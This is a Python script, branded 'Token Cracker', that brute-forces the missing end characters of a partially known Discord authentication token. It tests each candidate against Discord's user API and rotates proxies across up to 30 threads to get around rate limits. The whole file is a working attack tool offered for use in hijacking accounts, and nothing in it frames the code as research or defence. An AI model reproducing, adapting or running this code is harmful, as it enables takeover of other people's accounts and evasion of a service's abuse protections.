import itertools
import string
import requests
import time
from datetime import datetime
from colorama import Fore, Style
import ctypes
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
import threading

def current_time():
    return datetime.now().strftime(f"{Fore.LIGHTBLACK_EX}%I:%M:%S %p | {Style.RESET_ALL}")

def format_time(seconds):
    minutes = int(seconds // 60)
    seconds = int(seconds % 60)
    return f"{minutes}m {round(seconds)}s"

def load_proxies(file_path):
    with open(file_path, 'r') as file:
        return [f"http://{line.strip()}" for line in file if line.strip()]

def save_proxies(file_path, proxies):
    with open(file_path, 'w') as file:
        for proxy in proxies:
            file.write(f"{proxy.split('://')[1]}\n")

def validate_proxy(proxy):
    test_url = 'https://www.google.com/'
    try:
        print(f"{current_time()}" + purple(f"[INFO] ↗️ Testing Proxy: {proxy}"))
        response = requests.get(test_url, proxies={'http': proxy, 'https': proxy}, timeout=5)
        return response.status_code == 200
    except requests.RequestException:
        return False

def filter_proxies(proxies):
    valid_proxies = [proxy for proxy in proxies if validate_proxy(proxy)]
    invalid_proxies = set(proxies) - set(valid_proxies)
    
    for proxy in invalid_proxies:
        print(f"{current_time()}{Fore.RED}[INFO] Removed Invalid proxy: {proxy}")
    
    save_proxies('proxies.txt', valid_proxies)
    return valid_proxies

def update_console():
    global tries
    while not stop_event.is_set():
        time.sleep(0.1)
        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW(f"Token Cracker | {tries} Tries")
        else:
            sys.stdout.write(f"\033]0;Token Cracker | {tries} Tries\007")
            sys.stdout.flush()

def red(text):
    os.system(""); faded = ""
    for line in text.splitlines():
        green = 250
        for character in line:
            green -= 5
            if green < 0:
                green = 0
            faded += (f"\033[38;2;255;{green};0m{character}\033[0m")
    return faded

def purple(text):
    os.system("")
    faded = ""
    down = False

    for line in text.splitlines():
        red = 40
        for character in line:
            if down:
                red -= 3
            else:
                red += 3
            if red > 254:
                red = 255
                down = True
            elif red < 1:
                red = 30
                down = False
            faded += (f"\033[38;2;{red};0;220m{character}\033[0m")
    return faded

def estimate_time(suffix_length, time_per_token, chars_per_position=62):
    total_combinations = chars_per_position ** suffix_length
    total_time_seconds = total_combinations * time_per_token

    hours = total_time_seconds // 3600
    minutes = (total_time_seconds % 3600) // 60
    seconds = total_time_seconds % 60

    return hours, minutes, seconds

def check_token(token, proxy=None):
    global tries
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    proxies = {'http': proxy, 'https': proxy} if proxy else None
    try:
        if stop_event.is_set():
            return
        response = requests.get('https://discordapp.com/api/v10/users/@me', headers=headers, proxies=proxies)
        elapsed_time = time.time() - start_time

        if response.status_code in [200, 400]:
            print(f"{current_time()}" + purple(f"[SUCCESS] ✅ Cracked Token: {token} | Tries: {tries} ({format_time(elapsed_time)})"))
            stop_event.set() 
        elif response.status_code == 429:
            print(f"{current_time()}" + red(f"[ERROR] ⏰ Ratelimit Hit | Proxy = {proxy} ({format_time(elapsed_time)})"))
            time.sleep(5)
        else:
            print(f"{current_time()}" + red(f"[FAIL] ❌ {response.status_code} | {token} ({format_time(elapsed_time)})"))
            tries += 1
    except requests.RequestException as e:
        elapsed_time = time.time() - start_time
        print(f"{current_time()}" + red(f"[ERROR] 🌋 Exception occurred: {str(e)} ({format_time(elapsed_time)})"))
        time.sleep(5)

if __name__ == "__main__":
    banner = '''
    
▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █                  
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █                  
▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒                 
░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒   Crack Discord Tokens           
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░   With Ease ⚡             
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒                  
    ░      ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░                 
  ░      ░ ░ ▒  ░ ░░ ░    ░      ░   ░ ░      By @the_isadami | guns.lol/isadami           
             ░ ░  ░  ░      ░  ░         ░                  
  ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███  
▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░          ░           ░  ░░ ░      ░  ░      ░  ░   ░     
░ ░         ░                           ░                 
░    ░     ░                              ░                
                                                            
Attention: This is only if you have lets say 70 alphanumerics and you need the last 2 alphanumeric.
Attention: It would take years to crack more than 4/5 missing alphanumerics

'''

    os.system("cls")
    tries = 0
    stop_event = threading.Event()
    title_thread = threading.Thread(target=update_console, daemon=True)
    title_thread.start()
    print(banner)

    try:
        use_proxies = input(f"{current_time()}" + purple("[INFO] 🛜 Do you want to use proxies? (yes/no): ")).strip().lower()
        proxies_enabled = use_proxies in ['yes', 'y']

        if proxies_enabled:
            threads = 30
            proxy_list = load_proxies('proxies.txt')
            print(f"{current_time()}" + purple(f"[INFO] 🛜 Loaded {len(proxy_list)} Proxies"))
            proxy_list = filter_proxies(proxy_list)
            print(f"{current_time()}" + purple(f"[INFO] 🛜 Valid proxies count: {len(proxy_list)}"))
        else:
            threads = 1

        proxy_pool = cycle(proxy_list) if proxies_enabled else None

        token_prefix = input(f"{current_time()}" + purple("[INFO] 🔑 Enter the start of the token to crack: "))
        suffix_length = int(input(f"{current_time()}" + purple("[INFO] 🔢 Enter the number of alphanumerics to add & try at the end: ")))

        characters = string.ascii_letters + string.digits
        start_time = time.time()

        if proxies_enabled:
            print(f"{current_time()}" + purple(f"[INFO] ⚡ Starting the Cracker... | ⏰ Maximum Time Until Crack:  I dunno actually lol depends on your proxies so i didnt do the math :D ({62 ** suffix_length} Maximum Tries) | 🛜 {len(proxy_list)} Proxies"))
            time.sleep(2)
        else:
            hours, minutes, seconds = estimate_time(suffix_length, time_per_token=0.125)
            print(f"{current_time()}" + purple(f"[INFO] ⚡ Starting the Cracker... | ⏰ Maximum Time Until Crack:  {hours} hours, {minutes} minutes, {seconds} seconds ({62 ** suffix_length} Maximum Tries) | 🛜 Proxies Disabled"))
            time.sleep(2)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for combination in itertools.product(characters, repeat=suffix_length):
                if stop_event.is_set():
                    break
                full_token = token_prefix + ''.join(combination)
                proxy = next(proxy_pool) if proxies_enabled else None
                future = executor.submit(check_token, full_token, proxy)
                futures.append(future)
            
            for future in as_completed(futures):
                if stop_event.is_set():
                    break
                future.result() 

    except KeyboardInterrupt:
        print(f"\n{current_time()}" + red("[INFO] Exiting Cracker (Ctrl + C Pressed)..."))
        os.system("pause")
